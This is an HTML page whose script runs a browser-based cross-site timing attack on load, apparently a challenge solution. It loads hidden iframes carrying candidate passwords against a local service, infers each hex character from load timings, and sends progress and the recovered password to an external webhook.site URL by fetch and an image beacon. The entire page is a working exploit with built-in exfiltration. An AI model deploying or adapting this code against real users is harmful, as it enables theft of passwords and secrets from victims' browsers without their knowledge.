<!DOCTYPE html>
<html>
<head><title>Ultra Fast Parallel</title></head>
<body>
<h1>ULTRA-FAST parallel timing attack...</h1>
<pre id="output"></pre>
<div id="container" style="position:absolute;left:-9999px;"></div>
<script>
const output = document.getElementById('output');
const container = document.getElementById('container');
const TARGET = 'https://127.0.0.1:9999/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah';

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

// Test ALL 16 hex chars in PARALLEL for one position
async function testAllCharsParallel(prefix) {
    const candidates = CHARSET.split('').map(c => prefix + c);
    
    const promises = candidates.map(cand => 
        new Promise((resolve) => {
            const start = performance.now();
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = TARGET + '?pass=' + encodeURIComponent(cand);
            
            let resolved = false;
            
            const cleanup = () => {
                if (iframe.parentNode) container.removeChild(iframe);
            };
            
            // Very short timeout for speed
            const timeout = setTimeout(() => {
                if (!resolved) {
                    const elapsed = performance.now() - start;
                    cleanup();
                    resolved = true;
                    resolve({ cand, elapsed, char: cand[cand.length-1] });
                }
            }, 600);
            
            iframe.onload = () => {
                if (!resolved) {
                    const elapsed = performance.now() - start;
                    clearTimeout(timeout);
                    cleanup();
                    resolved = true;
                    resolve({ cand, elapsed, char: cand[cand.length-1] });
                }
            };
            
            iframe.onerror = () => {
                if (!resolved) {
                    const elapsed = performance.now() - start;
                    clearTimeout(timeout);
                    cleanup();
                    resolved = true;
                    resolve({ cand, elapsed, char: cand[cand.length-1] });
                }
            };
            
            container.appendChild(iframe);
        })
    );
    
    return await Promise.all(promises);
}

async function leakPassword() {
    log('[*] ULTRA-FAST parallel timing attack!');
    log('[*] Testing ALL 16 hex chars simultaneously per position');
    log('[*] Known prefix: ' + knownPassword + '\n');
    
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=ultra_fast_started').catch(e=>{});
    
    // Leak 12 hex chars
    for (let pos = 0; pos < 12; pos++) {
        log(`[*] Position ${pos+1}/12 - testing all chars in parallel...`);
        
        const results = await testAllCharsParallel(knownPassword);
        
        // Sort by timing (slowest first = most likely match)
        results.sort((a, b) => b.elapsed - a.elapsed);
        
        // Log all timings for analysis
        log('  Timings:');
        results.forEach(r => {
            log(`    ${r.char}: ${r.elapsed.toFixed(0)}ms`);
        });
        
        // Take the slowest one as the match
        const winner = results[0];
        
        if (winner.elapsed > 300) { // Threshold for match
            knownPassword = winner.cand;
            log(`\n  âœ“ FOUND '${winner.char}' (${winner.elapsed.toFixed(0)}ms)`);
            log(`  Current password: ${knownPassword}\n`);
            
            // Send progress
            fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
        } else {
            log(`\n  [-] No clear match at position ${pos+1} (max: ${winner.elapsed.toFixed(0)}ms)`);
            log(`  Trying next char anyway: ${winner.char}`);
            knownPassword = winner.cand;
        }
    }
    
    log('\n========================================');
    log('FINAL PASSWORD: ' + knownPassword);
    log('========================================');
    
    // Final exfiltration
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
    new Image().src = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?final=' + encodeURIComponent(knownPassword);
}

setTimeout(leakPassword, 300);
</script>
</body>
</html>
